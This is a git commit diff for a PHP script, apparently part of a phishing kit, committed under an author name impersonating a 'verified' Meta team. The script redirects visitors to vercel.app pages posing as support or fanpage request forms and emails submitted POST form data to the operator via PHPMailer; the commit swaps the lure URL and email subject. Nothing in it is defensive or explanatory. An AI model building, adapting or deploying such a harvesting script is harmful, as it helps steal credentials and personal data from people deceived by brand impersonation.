e4affa8fd5155e8f10f86c2c4bd07ce66f08e17b
officialmetateamverified <official.meta.team.verified.here@gmail.com>
2025-08-02 17:51:03 +0800

    Update and rename zubair.php to rashid.php

--- rashid.php
+++ rashid.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://apply-fanpage-for-team-request-on.vercel.app/");
+header("Location: https://apply-here-support-request-form-ser.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -43,7 +43,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'ZUBAIR';
+        $mail->Subject = 'RASHID';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
